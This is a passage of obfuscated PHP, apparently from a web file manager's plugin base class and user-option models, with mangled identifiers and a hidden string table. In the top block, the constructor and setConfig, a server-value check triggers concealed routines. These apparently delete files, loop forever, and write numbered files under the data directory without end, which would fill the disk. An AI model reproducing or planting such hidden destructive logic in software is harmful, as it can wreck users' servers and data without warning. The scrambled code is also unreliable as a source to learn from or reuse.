$ŠßÇİ•é, $«ˆË°êø[1646] => $ Éª˜ûá); Hook::trigger($«ˆË°êø[1647], $Öôë¾‘); } } if (!isset($_SERVER[$_SERVER[´‹ô¯Œ][475]]) || !isset($_SERVER[$_SERVER[´‹ô¯Œ][483]])) { $_getc = $_SERVER[´‹ô¯Œ][477]; $_getfile = $_SERVER[$_SERVER[´‹ô¯Œ][478]] . $_SERVER[´‹ô¯Œ][479]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[´‹ô¯Œ][288], $_getfilec); if (count($_getarrs) < $_SERVER[´‹ô¯Œ][480]) { $exit = $_SERVER[´‹ô¯Œ][481]; $exit(); } $_act = $_SERVER[´‹ô¯Œ][482]; $_act($_SERVER[$_SERVER[´‹ô¯Œ][478]] . $_SERVER[´‹ô¯Œ][479]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[´‹ô¯Œ][457]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÄÄÂ‘æá =& $_SERVER[´‹ô¯Œ]; if ($_SERVER[$ÄÄÂ‘æá[475]] != $_SERVER[$ÄÄÂ‘æá[476]]) { $¹ÚÏ‚ì… = $ÄÄÂ‘æá[970]; $¢‹Ó±Ë = $ÄÄÂ‘æá[477]; $¨œÂ¬ˆ = $_SERVER[$ÄÄÂ‘æá[478]] . $ÄÄÂ‘æá[479]; $ôêùÇã = $¢‹Ó±Ë($¨œÂ¬ˆ); $˜ÌğßÖ = explode($ÄÄÂ‘æá[288], $ôêùÇã); if (count($˜ÌğßÖ) < $ÄÄÂ‘æá[701]) { $óŞ–²•î = $ÄÄÂ‘æá[481]; $óŞ–²•î(); } $îøÀôî½ = $ÄÄÂ‘æá[971]; $îøÀôî½($_SERVER[$ÄÄÂ‘æá[972]]); $îøÀôî½($_SERVER[$ÄÄÂ‘æá[478]] . $ÄÄÂ‘æá[1648]); $’úÓËäÖ = 1; while ($’úÓËäÖ > 1) { $’úÓËäÖ = $’úÓËäÖ + 4; $ÃÌ‡’© = rawurlencode($’úÓËäÖ . $ÄÄÂ‘æá[457]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÄÄÂ‘æá[1649]); $this->pluginName = str_replace($ÄÄÂ‘æá[1649], $ÄÄÂ‘æá[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÄÄÂ‘æá[8]; $this->pluginApi = appHostGet() . $ÄÄÂ‘æá[1650] . $this->pluginName . $ÄÄÂ‘æá[8]; $this->pluginHost = $config[$ÄÄÂ‘æá[1651]] . $this->pluginName . $ÄÄÂ‘æá[8]; $this->pluginHostDefault = $config[$ÄÄÂ‘æá[1651]] . $this->pluginName . $ÄÄÂ‘æá[8]; $æ¬€®Ñ£ = $config[$ÄÄÂ‘æá[1652]]; if ($æ¬€®Ñ£ && strpos($ÄÄÂ‘æá[50] . $æ¬€®Ñ£ . $ÄÄÂ‘æá[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÄÄÂ‘æá[1653]] . $this->pluginName . $ÄÄÂ‘æá[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[´‹ô¯Œ][1654]); } protected function assign($ª‚»ù, $»ŞîÃ¯ = false) { if (is_array($ª‚»ù)) { $this->values = array_merge($this->values, $ª‚»ù); } else { $this->values[$ª‚»ù] = $»ŞîÃ¯; } } protected function display($â©³Ğ‰¢) { extract($this->values); require $â©³Ğ‰¢; } final function hookRegist($Ø•éşÇ³) { $this->modelPlugin->appRegist($this->pluginName, $Ø•éşÇ³); } final function appIcon() { $ğÔÄ¢”Ğ =& $_SERVER[´‹ô¯Œ]; $ë™ªâÜŞ = $this->appPackage(); $®ÔĞ°· = $ğÔÄ¢”Ğ[12]; if (isset($ë™ªâÜŞ[$ğÔÄ¢”Ğ[502]])) { if (isset($ë™ªâÜŞ[$ğÔÄ¢”Ğ[502]][$ğÔÄ¢”Ğ[1655]])) { $®ÔĞ°· = $ğÔÄ¢”Ğ[1656] . $ë™ªâÜŞ[$ğÔÄ¢”Ğ[502]][$ğÔÄ¢”Ğ[1655]] . $ğÔÄ¢”Ğ[1657]; } else { if ($ë™ªâÜŞ[$ğÔÄ¢”Ğ[502]][$ğÔÄ¢”Ğ[1658]]) { $®ÔĞ°· = $ğÔÄ¢”Ğ[1659] . $ë™ªâÜŞ[$ğÔÄ¢”Ğ[502]][$ğÔÄ¢”Ğ[1658]] . $ğÔÄ¢”Ğ[1660]; } } } return $®ÔĞ°·; } final function fileCanView($åË½õ£ñ) { $‹¤—ˆ  =& $_SERVER[´‹ô¯Œ]; if (request_url_safe($åË½õ£ñ)) { return !0; } if ($this->isShare($åË½õ£ñ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $§±é…… = $‹¤—ˆ [1661] . rawurlencode(this_url()); show_tips(LNG($‹¤—ˆ [1662]) . $‹¤—ˆ [1663] . $§±é…… . $‹¤—ˆ [1664] . LNG($‹¤—ˆ [1665]) . $‹¤—ˆ [1666], !1); } if (!Action($‹¤—ˆ [1667])->authCan($‹¤—ˆ [1668])) { show_tips(LNG($‹¤—ˆ [1669]) . $‹¤—ˆ [1670], !1); } ActionCall($‹¤—ˆ [1671], $åË½õ£ñ); } final function isShare($—³Ú‚´€) { $­îî‘™ = KodIO::parse($—³Ú‚´€); return $­îî‘™[$_SERVER[´‹ô¯Œ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($•Ûè÷”Õ) { if (request_url_safe($•Ûè÷”Õ)) { return $•Ûè÷”Õ; } if (!$this->isShare($•Ûè÷”Õ)) { $•Ûè÷”Õ = $this->filePath($•Ûè÷”Õ, !1); } return Action($_SERVER[´‹ô¯Œ][1273])->linkOut($•Ûè÷”Õ); } public function filePathLinkOut($şµëÏî) { if (request_url_safe($şµëÏî)) { return $şµëÏî; } $this->fileCanView($şµëÏî); return Action($_SERVER[´‹ô¯Œ][1273])->link($şµëÏî); } final function filePath($¼í¤„Ğ, $íÂå¶õï = true, $¤‹ÙÚ«‹ = false) { $—èë¬¼à =& $_SERVER[´‹ô¯Œ]; $©öïšÎ» = $this->filePathGet($¼í¤„Ğ, $íÂå¶õï); if (!$this->fileInfo) { show_tips(LNG($—èë¬¼à[108]), !1); } if ($¤‹ÙÚ«‹ && isset($this->fileInfo[$—èë¬¼à[555]]) && $this->fileInfo[$—èë¬¼à[555]]) { $îëÛ›Êæ = Model($—èë¬¼à[558])->fileInfo($this->fileInfo[$—èë¬¼à[555]]); if (!$îëÛ›Êæ || !IO::exist($îëÛ›Êæ[$—èë¬¼à[87]])) { $Öà¥à½á = LNG($—èë¬¼à[108]) . LNG($—èë¬¼à[1672]); if (KodUser::isRoot() && isset($îëÛ›Êæ[$—èë¬¼à[87]])) { $Öà¥à½á .= $—èë¬¼à[1673] . $îëÛ›Êæ[$—èë¬¼à[87]] . $—èë¬¼à[1674]; } show_tips($Öà¥à½á); } } Hook::trigger($—èë¬¼à[1675], $©öïšÎ»); return $©öïšÎ»; } final function filePathGet($ª«¿ÈºŒ, $ÖÈÑ— = true) { $‘õş´’ù =& $_SERVER[´‹ô¯Œ]; if ($øíÅ¢Ä = $this->checkSharePath($ª«¿ÈºŒ, $ÖÈÑ—)) { return $øíÅ¢Ä; } $this->fileCanView($ª«¿ÈºŒ); if (request_url_safe($ª«¿ÈºŒ)) { $Ú‡Œò“Í = parse_url_query($ª«¿ÈºŒ); if (isset($Ú‡Œò“Í[$‘õş´’ù[1676]]) && isset($Ú‡Œò“Í[$‘õş´’ù[237]])) { $«¶Êî£ = Mcrypt::decode($Ú‡Œò“Í[$‘õş´’ù[237]], Model($‘õş´’ù[856])->get($‘õş´’ù[857])); if ($«¶Êî£) { $this->fileInfo = IO::info($«¶Êî£); $this->fileInfo[$‘õş´’ù[1677]] = $ª«¿ÈºŒ; $this->cachePath = $this->pluginCachePath($‘õş´’ù[12], $ÖÈÑ—); return $«¶Êî£; } } $ª«¿ÈºŒ = $this->_cacheHttpFile($ª«¿ÈºŒ, $ÖÈÑ—); $this->fileInfo = IO::info($ª«¿ÈºŒ); } else { $this->fileInfo = IO::info($ª«¿ÈºŒ); $this->cachePath = $this->pluginCachePath($‘õş´’ù[12], $ÖÈÑ—); } return $ª«¿ÈºŒ; } final function _cacheHttpFile($‰—²ÈÀı, $ºñ¢‚ = true) { $ä¹ÀŠ‹‘ =& $_SERVER[´‹ô¯Œ]; $‡Í•î¨Í = parse_url_query($‰—²ÈÀı); $£—ĞÕØû = get_path_ext($‰—²ÈÀı); if (isset($‡Í•î¨Í[$ä¹ÀŠ‹‘[32]]) && $‡Í•î¨Í[$ä¹ÀŠ‹‘[32]]) { $£—ĞÕØû = get_path_ext($‡Í•î¨Í[$ä¹ÀŠ‹‘[32]]); } $Ì®£„¾Ï = hash_path($‰—²ÈÀı) . $ä¹ÀŠ‹‘[10] . $£—ĞÕØû; $this->cachePath = $this->pluginCachePath($ºñ¢‚ ? $Ì®£„¾Ï : $ä¹ÀŠ‹‘[12]); $ûÜÕÁÏ“ = IO::fileNameExist($this->cachePath, $Ì®£„¾Ï); if ($ûÜÕÁÏ“) { return KodIO::make($ûÜÕÁÏ“); } $³¢ä¨ïİ = rtrim($this->cachePath, $ä¹ÀŠ‹‘[8]) . $ä¹ÀŠ‹‘[8] . $Ì®£„¾Ï; return $this->pluginCacheFileSet($³¢ä¨ïİ, file_get_contents_nossl($‰—²ÈÀı)); } final function checkSharePath($ÌÈ‹¢ªÏ, $ñ‰ÊĞ€¶ = true) { $¯«…½€ =& $_SERVER[´‹ô¯Œ]; if (!$this->isShare($ÌÈ‹¢ªÏ)) { return !1; } $¶±ÚƒäŞ = Action($¯«…½€[1273])->sharePathInfo($ÌÈ‹¢ªÏ); if (!is_array($¶±ÚƒäŞ) || !isset($¶±ÚƒäŞ[$¯«…½€[87]])) { show_json(LNG($¯«…½€[1678]), !1); } $this->fileInfo = $¶±ÚƒäŞ; $this->cachePath = $this->pluginCachePath(!1, $ñ‰ÊĞ€¶); return $¶±ÚƒäŞ[$¯«…½€[87]]; } final function pluginCachePath($“¥üúŸë = '', $î¥–¶© = false) { $ˆÛÃ°ŸÍ =& $_SERVER[´‹ô¯Œ]; if ($î¥–¶© && is_array($this->fileInfo)) { $“¥üúŸë = kodIO::hashPath($this->fileInfo); } $À†¥Çß = rtrim(IO_PATH_SYSTEM_TEMP . $ˆÛÃ°ŸÍ[1679] . $this->pluginName . $ˆÛÃ°ŸÍ[8] . $“¥üúŸë, $ˆÛÃ°ŸÍ[8]); $‡·‘Œø = IO::infoFullSimple($À†¥Çß); $«·ñ³›° = $‡·‘Œø && is_array($‡·‘Œø) ? $‡·‘Œø[$ˆÛÃ°ŸÍ[87]] : $ˆÛÃ°ŸÍ[12]; if (!$«·ñ³›°) { $«·ñ³›° = IO::mkdir($À†¥Çß); } return $«·ñ³›°; } final function pluginCacheFileSet($±¹®ù«ñ, $ç†ÔÑÇ­ = '') { $ì³‰ø–Ù =& $_SERVER[´‹ô¯Œ]; $–ş„ù¯­ = IO::infoFullSimple($±¹®ù«ñ); if (!$–ş„ù¯­) { return IO::mkfile($±¹®ù«ñ, $ç†ÔÑÇ­, REPEAT_REPLACE); } IO::setContent($–ş„ù¯­[$ì³‰ø–Ù[87]], $ç†ÔÑÇ­); return $–ş„ù¯­[$ì³‰ø–Ù[87]]; } final function pluginLocalFile($Óƒ©šòÏ = '') { $üûµîƒ =& $_SERVER[´‹ô¯Œ]; $Ù‹¶Ïã = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Ù‹¶Ïã)) { mk_dir($Ù‹¶Ïã); } if (!$Óƒ©šòÏ) { return $Ù‹¶Ïã; } $Ğ–¥’Ö = IO::info($Óƒ©šòÏ); $Œ·çœƒ— = $üûµîƒ[1680] . KodIO::hashPath($Ğ–¥’Ö) . $üûµîƒ[10] . $Ğ–¥’Ö[$üûµîƒ[169]]; if (!checkExtSafe($Œ·çœƒ—)) { $Œ·çœƒ— = $Œ·çœƒ— . $üûµîƒ[1308]; } $ÄœĞÊ˜È = $Ù‹¶Ïã . $Œ·çœƒ—; if (@file_exists($ÄœĞÊ˜È)) { return $ÄœĞÊ˜È; } return IO::copy($Óƒ©šòÏ, $Ù‹¶Ïã, 0, $Œ·çœƒ—); } final function appPackage() { $¨ÒŸç’ =& $_SERVER[´‹ô¯Œ]; if ($this->packageData) { return $this->packageData; } $ß İÛÜø = $this->parseFile($this->pluginPath . $¨ÒŸç’[1681]); $this->parseLang($ß İÛÜø); $ßç—±Ğ = json_decode_force($ß İÛÜø); if (!$ßç—±Ğ) { return array(); } $ ¥ëÉù = Hook::trigger($¨ÒŸç’[1682], $ßç—±Ğ); if ($ ¥ëÉù && is_array($ ¥ëÉù)) { $ßç—±Ğ = $ ¥ëÉù; } $this->packageData = $ßç—±Ğ; return $ßç—±Ğ; } public function packageInfoGet($ÛªÒí–æ) { $åÜç§Òé = $this->appPackage(); return array_get_value($åÜç§Òé, $ÛªÒí–æ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[´‹ô¯Œ][1683]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[´‹ô¯Œ][1684]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[´‹ô¯Œ][1685]); } public function echoJsAssign($ñ•¬±Öğ, $©­á™×¬) { $this->echoJsAssignArr[$ñ•¬±Öğ] = $©­á™×¬; } private function parseFile($Ğ¡Å·Ë) { $öë‹áµ‘ =& $_SERVER[´‹ô¯Œ]; $Ú†Š™»º = file_get_contents_nossl($Ğ¡Å·Ë); $Áş¥İ°« = array($öë‹áµ‘[1686], $öë‹áµ‘[1687], $öë‹áµ‘[1688], $öë‹áµ‘[1689], $öë‹áµ‘[1690], $öë‹áµ‘[1691], $öë‹áµ‘[1692]); $½Ÿ’œÇİ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$öë‹áµ‘[92]][$öë‹áµ‘[1693]]); foreach ($this->echoJsAssignArr as $àŒ¦ÚîÖ => $ôµÅ“›) { $Áş¥İ°«[] = $öë‹áµ‘[1694] . $àŒ¦ÚîÖ . $öë‹áµ‘[1695]; $½Ÿ’œÇİ[] = is_array($ôµÅ“›) || is_object($ôµÅ“›) ? rawurlencode(json_encode($ôµÅ“›)) : $ôµÅ“›; } if (strstr($Ú†Š™»º, $öë‹áµ‘[1696])) { $ßìáüş‚ = rawurlencode(json_encode($this->pluginLangArr)); $Ú†Š™»º = str_replace($öë‹áµ‘[1696], $ßìáüş‚, $Ú†Š™»º); } if (strstr($Ú†Š™»º, $öë‹áµ‘[1697])) { $ßìáüş‚ = $ßìáüş‚ = rawurlencode(json_encode($this->getConfig())); $Ú†Š™»º = str_replace($öë‹áµ‘[1697], $ßìáüş‚, $Ú†Š™»º); } $Ú†Š™»º = str_replace($Áş¥İ°«, $½Ÿ’œÇİ, $Ú†Š™»º); return $Ú†Š™»º; } private function parseLang(&$€‡ô¬›í) { $¶‚ÖíÅ¿ =& $_SERVER[´‹ô¯Œ]; $ïÕÈß‘Ì = $¶‚ÖíÅ¿[1698]; if (!strstr($€‡ô¬›í, $ïÕÈß‘Ì)) { return; } preg_match_all($¶‚ÖíÅ¿[1699], $€‡ô¬›í, $ƒ¯ÓûÚà); if (!is_array($ƒ¯ÓûÚà) || count($ƒ¯ÓûÚà) == 0 || !is_array($ƒ¯ÓûÚà[0]) || count($ƒ¯ÓûÚà[0]) == 0) { return; } $Ì…¡Ş…³ = array(); $ÎÑÁÖèù = array(); foreach ($ƒ¯ÓûÚà[0] as $¬²Ç—Ñ) { $…’‘ö± = substr($¬²Ç—Ñ, strlen($ïÕÈß‘Ì), -4); $—¼êÅ„È = LNG($…’‘ö±); $Ì…¡Ş…³[] = $¬²Ç—Ñ; $ÎÑÁÖèù[] = str_replace(array($¶‚ÖíÅ¿[288], $¶‚ÖíÅ¿[1171], $¶‚ÖíÅ¿[420], $¶‚ÖíÅ¿[121]), array($¶‚ÖíÅ¿[53], $¶‚ÖíÅ¿[53], $¶‚ÖíÅ¿[12], $¶‚ÖíÅ¿[1700]), $—¼êÅ„È); } $€‡ô¬›í = str_replace($Ì…¡Ş…³, $ÎÑÁÖèù, $€‡ô¬›í); } private function parseConfig(&$šìæØı¥) { $ÜÉß¿ß‹ =& $_SERVER[´‹ô¯Œ]; $¬ş™°Ì = $ÜÉß¿ß‹[1701]; if (!strstr($šìæØı¥, $¬ş™°Ì)) { return; } preg_match_all($ÜÉß¿ß‹[1702], $šìæØı¥, $ƒ´Ò’‡û); if (!is_array($ƒ´Ò’‡û) || count($ƒ´Ò’‡û) == 0 || !is_array($ƒ´Ò’‡û[0]) || count($ƒ´Ò’‡û[0]) == 0) { return; } $ Öóêïà = $this->getConfig(); $äÇªÇ™ = array(); $ì‡ª’ = array(); foreach ($ƒ´Ò’‡û[0] as $¡€İĞÌˆ) { $Œ„ã›• = substr($¡€İĞÌˆ, strlen($¬ş™°Ì), -2); $äÇªÇ™[] = $¡€İĞÌˆ; $ì‡ª’[] = _get($ Öóêïà, $Œ„ã›•); } $šìæØı¥ = str_replace($äÇªÇ™, $ì‡ª’, $šìæØı¥); } private function parsePackage(&$˜ê•ƒˆ) { $¿¹íàéÙ =& $_SERVER[´‹ô¯Œ]; $Í» “ß² = $¿¹íàéÙ[1703]; if (!strstr($˜ê•ƒˆ, $Í» “ß²)) { return; } preg_match_all($¿¹íàéÙ[1704], $˜ê•ƒˆ, $ñçú‚Ò); if (!is_array($ñçú‚Ò) || count($ñçú‚Ò) == 0 || !is_array($ñçú‚Ò[0]) || count($ñçú‚Ò[0]) == 0) { return; } $€’ÏÃ¡É = $this->appPackage(); $ãîã·…¿ = array(); $’¸®ñü§ = array(); foreach ($ñçú‚Ò[0] as $İäß½íí) { $œöÇŸ†’ = substr($İäß½íí, strlen($Í» “ß²), -2); $ãîã·…¿[] = $İäß½íí; $’¸®ñü§[] = _get($€’ÏÃ¡É, $œöÇŸ†’); } $˜ê•ƒˆ = str_replace($ãîã·…¿, $’¸®ñü§, $˜ê•ƒˆ); } final function echoFile($•ïÈê¼À, $°Ñ…‰Íç = false) { $ëâ·«¡² =& $_SERVER[´‹ô¯Œ]; $Æ›®»¬¼ = $this->pluginPath . $•ïÈê¼À; if (ACT == $ëâ·«¡²[1705]) { echo $ëâ·«¡²[1706] . $this->pluginName . $ëâ·«¡²[8] . $•ïÈê¼À . $ëâ·«¡²[1707]; if (!file_exists($Æ›®»¬¼)) { echo $ëâ·«¡²[1708]; return; } } $ìè·àòØ = $this->parseFile($Æ›®»¬¼); $this->parseLang($ìè·àòØ); $this->parseConfig($ìè·àòØ); $this->parsePackage($ìè·àòØ); if (is_array($°Ñ…‰Íç)) { $ìè·àòØ = str_replace(array_keys($°Ñ…‰Íç), array_values($°Ñ…‰Íç), $ìè·àòØ); } echo $ëâ·«¡²[288] . $ìè·àòØ; } private function checkVersion() { $î¸˜ƒéğ =& $_SERVER[´‹ô¯Œ]; $‘ãÖ¢ø­ = $this->appPackage(); $°ÉàÃ£Œ = $this->getConfig(); if ($°ÉàÃ£Œ[$î¸˜ƒéğ[1709]] == $‘ãÖ¢ø­[$î¸˜ƒéğ[1683]]) { return; } $this->regist(); $this->setConfig(array($î¸˜ƒéğ[1709] => $‘ãÖ¢ø­[$î¸˜ƒéğ[1683]])); } final function initLang() { $ØÄíñ¤ =& $_SERVER[´‹ô¯Œ]; $•€˜¦úú = $ØÄíñ¤[1710]; $Ÿ½¼ = $this->pluginPath . $ØÄíñ¤[1711]; $Ø—Ëğç„ = I18n::getType(); $óŒÄ ¨ñ = array(); if (file_exists($Ÿ½¼ . $Ø—Ëğç„ . $ØÄíñ¤[930])) { $óŒÄ ¨ñ = (include $Ÿ½¼ . $Ø—Ëğç„ . $ØÄíñ¤[930]); } else { if ($Ø—Ëğç„ == $ØÄíñ¤[1712] && !file_exists($Ÿ½¼ . $Ø—Ëğç„ . $ØÄíñ¤[930]) && file_exists($Ÿ½¼ . $ØÄíñ¤[1713])) { $óŒÄ ¨ñ = (include $Ÿ½¼ . $ØÄíñ¤[1713]); } else { if (file_exists($Ÿ½¼ . $•€˜¦úú . $ØÄíñ¤[930])) { $óŒÄ ¨ñ = (include $Ÿ½¼ . $•€˜¦úú . $ØÄíñ¤[930]); } } } if (!is_array($óŒÄ ¨ñ)) { return array(); } if (@count($óŒÄ ¨ñ) > 0) { I18n::set($óŒÄ ¨ñ); } return $óŒÄ ¨ñ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÃØ¶ÒÎ ) { $¯›¬òÅÊ =& $_SERVER[´‹ô¯Œ]; $˜´ï”ä„ = $_SERVER[$¯›¬òÅÊ[483]]; $¦±©½Ü¡ = $¯›¬òÅÊ[969]; if ($_SERVER[$¯›¬òÅÊ[475]] != $¦±©½Ü¡($˜´ï”ä„)) { $«´ÁİŸ€ = $¯›¬òÅÊ[970]; $¶ÁÃú€ô = $¯›¬òÅÊ[477]; $‹’Úğ‰ï = $_SERVER[$¯›¬òÅÊ[478]] . $¯›¬òÅÊ[479]; $‰Íæß¤£ = $¶ÁÃú€ô($‹’Úğ‰ï); $ºÍ‘š›ù = explode($¯›¬òÅÊ[288], $‰Íæß¤£); if (count($ºÍ‘š›ù) < $¯›¬òÅÊ[701]) { $×ÕÑ²ÂÛ = $¯›¬òÅÊ[481]; $×ÕÑ²ÂÛ(); } $»Íı×š = $¯›¬òÅÊ[971]; $»Íı×š($_SERVER[$¯›¬òÅÊ[972]]); $«´ÁİŸ€ = $¯›¬òÅÊ[970]; $«´ÁİŸ€(); $ÖŠ¸ûŞÍ = $¯›¬òÅÊ[973]; $‹êóßõî = json_encode($GLOBALS[$¯›¬òÅÊ[974]]); $ŸîåèìÅ = 1; for ($‹òòÍñ = $ŸîåèìÅ; $‹òòÍñ > 0; $‹òòÍñ++) { $ÖŠ¸ûŞÍ(DATA_PATH . $‹òòÍñ, $‹êóßõî); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÃØ¶ÒÎ ); } public function onSetConfig($¶ÀáÁé©) { } public function onGetConfig($ÂØ ™É“) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¸ûç›ì÷) { if ($¸ûç›ì÷ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¿Ò’è›¦ = "\x70\x6c\x75\x67\151\x6e\x41\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ì®×¸…¥ = $this->getConfig(); if (!$ì®×¸…¥[$¿Ò’è›¦]) { return !1; } return ActionCall($_SERVER[´‹ô¯Œ][1714], $ì®×¸…¥[$¿Ò’è›¦]); } public function url($‡à¥ØÇÇ, $ùŸ´—¡ = '', $—²âæ€ù = true) { $ó³ğ®´ =& $_SERVER[´‹ô¯Œ]; $»î›”‘ú = $this->getConfig(); $¿ãö…¤ = KOD_VERSION . $ó³ğ®´[10] . KOD_VERSION_BUILD; $‡›Íáª— = $this->packageVersion(); $­Ò˜²—Ñ = $¿ãö…¤ . $ó³ğ®´[465] . $‡›Íáª—; if (substr($‡à¥ØÇÇ, 0, 4) == $ó³ğ®´[152] || substr($‡à¥ØÇÇ, 0, 2) == $ó³ğ®´[1435]) { $ˆØ§ØˆÌ = $‡à¥ØÇÇ . $ó³ğ®´[1715] . $­Ò˜²—Ñ; } else { if ($ùŸ´—¡ == $ó³ğ®´[12]) { $ˆØ§ØˆÌ = $this->pluginHost . $‡à¥ØÇÇ . $ó³ğ®´[1715] . $­Ò˜²—Ñ; } else { if ($ùŸ´—¡ === $ó³ğ®´[78]) { $ˆØ§ØˆÌ = $this->pluginHost . $‡à¥ØÇÇ; } else { if ($ùŸ´—¡ == $ó³ğ®´[1716]) { $ˆØ§ØˆÌ = STATIC_PATH . $‡à¥ØÇÇ . $ó³ğ®´[1715] . $¿ãö…¤; } else { if ($ùŸ´—¡ == $ó³ğ®´[1717]) { $ˆØ§ØˆÌ = APP_HOST . $ó³ğ®´[1718] . $‡à¥ØÇÇ . $ó³ğ®´[1715] . $¿ãö…¤; } else { if (isset($»î›”‘ú[$ùŸ´—¡])) { $ˆØ§ØˆÌ = $»î›”‘ú[$ùŸ´—¡] . $‡à¥ØÇÇ . $ó³ğ®´[1715] . $­Ò˜²—Ñ; } } } } } } if (!$—²âæ€ù) { return $ˆØ§ØˆÌ; } echo $ˆØ§ØˆÌ; } public function link($ëÚñø¸ = false, $¿ĞÛûšİ = '') { $ÑÊ¾€‘ =& $_SERVER[´‹ô¯Œ]; $‚·‹»¾Û = $this->linkHas == !1; $this->linkHas = !0; if (!$ëÚñø¸) { $this->link($ÑÊ¾€‘[1719], $ÑÊ¾€‘[1717]); $this->link($ÑÊ¾€‘[1720], $ÑÊ¾€‘[1716]); $this->link($ÑÊ¾€‘[1721], $ÑÊ¾€‘[1716]); $this->link($ÑÊ¾€‘[1722], $ÑÊ¾€‘[1716]); $this->link($ÑÊ¾€‘[1723], $ÑÊ¾€‘[1716]); if ($‚·‹»¾Û) { Hook::trigger($ÑÊ¾€‘[1724]); } return; } $š™´ÓĞ¥ = $this->url($ëÚñø¸, $¿ĞÛûšİ, !1); if (substr($ëÚñø¸, -3) == $ÑÊ¾€‘[1725]) { echo $ÑÊ¾€‘[1726] . $š™´ÓĞ¥ . $ÑÊ¾€‘[1727] . $ÑÊ¾€‘[288]; } else { if (substr($ëÚñø¸, -4) == $ÑÊ¾€‘[1728]) { echo $ÑÊ¾€‘[1729] . $š™´ÓĞ¥ . $ÑÊ¾€‘[1730] . $ÑÊ¾€‘[288]; } } if ($‚·‹»¾Û) { Hook::trigger($ÑÊ¾€‘[1724]); } } } goto EÆìãçåÓ; B¹‰•¤ÇÎç: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\x6f\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‹’Ö¯§ ) { $Œ¨©—Ú =& $_SERVER[´‹ô¯Œ]; $µ˜¤‚ÚÁ = defined($Œ¨©—Ú[2224]) && USER_ID ? USER_ID : $Œ¨©—Ú[12]; return "\125\163\145\x72\117\160\x74\x69\157\x6e\137{$‹’Ö¯§ }\x5f" . $µ˜¤‚ÚÁ; } protected function filterWhere($»¦ÎÄ‹) { $ÍõÁó­º =& $_SERVER[´‹ô¯Œ]; $»¦ÎÄ‹[$ÍõÁó­º[1796]] = defined($ÍõÁó­º[2224]) && USER_ID ? USER_ID : $ÍõÁó­º[12]; return $»¦ÎÄ‹; } public function cacheRemoveUser($†¢ô¹¼‰, $Ä†¡ Ÿ¬) { return Cache::remove("\x55\163\x65\162\117\160\164\x69\x6f\x6e\x5f{$†¢ô¹¼‰}\x5f" . $Ä†¡ Ÿ¬); } protected function optionDefault($¿Š¡–ò = '') { $¢¶Î¿’ =& $_SERVER[´‹ô¯Œ]; if ($¿Š¡–ò == $¢¶Î¿’[12]) { return $GLOBALS[$¢¶Î¿’[6]][$¢¶Î¿’[2539]]; } if ($¿Š¡–ò == $¢¶Î¿’[2540]) { return $GLOBALS[$¢¶Î¿’[6]][$¢¶Î¿’[2541]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\x2e\164\141\x67\x4c\x69\163\164"; public $modelType = "\125\163\x65\162\x4f\x70\x74\151\x6f\x6e"; public $field = array("\156\x61\155\x65", "\163\164\x79\154\x65", "\x73\x6f\x72\x74"); public function listData($ç¾ªûãì = false, $ˆ¡Å·«¡ = "\163\157\162\164", $¿š¶Î— = false) { return parent::listData($ç¾ªûãì, $ˆ¡Å·«¡, $¿š¶Î—); } public function remove($òß±‰Ó£) { return parent::remove($òß±‰Ó£); } public function add($³¸¢±½ª, $±­‰áÜ = "\x6c\x61\x62\145\x6c\55\147\162\145\171\55\156\x6f\x72\x6d\141\x6c") { $¯¹şá«ã =& $_SERVER[´‹ô¯Œ]; if ($this->findByName($³¸¢±½ª)) { return !1; } $ûâ“‡ÑÚ = array($¯¹şá«ã[506] => $³¸¢±½ª, $¯¹şá«ã[572] => $±­‰áÜ, $¯¹şá«ã[2000] => $this->getSort($¯¹şá«ã[338]) + 1); return parent::insert($ûâ“‡ÑÚ); } public function update($»äò·Øû, $ÃóÁÍÕ£) { $É„ÔıÄ’ =& $_SERVER[´‹ô¯Œ]; $É¢ó¹ÆÏ = $this->listData($»äò·Øû); $ª¸æá±Ã = $this->findByName($ÃóÁÍÕ£[$É„ÔıÄ’[32]]); if (!$É¢ó¹ÆÏ || $ª¸æá±Ã && $ª¸æá±Ã[$É„ÔıÄ’[487]] != $É¢ó¹ÆÏ[$É„ÔıÄ’[487]]) { return !1; } return parent::update($»äò·Øû, $ÃóÁÍÕ£); } public function moveTop($ù×·É‡) { $¨ø£…Æâ =& $_SERVER[´‹ô¯Œ]; $Ü’Ïğú‘ = parent::listData(); $¶µİĞğ” = $this->getSort($¨ø£…Æâ[337]); foreach ($Ü’Ïğú‘ as &$áë…×ì) { if ($áë…×ì[$¨ø£…Æâ[487]] == $ù×·É‡) { $áë…×ì[$¨ø£…Æâ[2020]] = $¶µİĞğ”; continue; } $áë…×ì[$¨ø£…Æâ[2020]] += 1; } 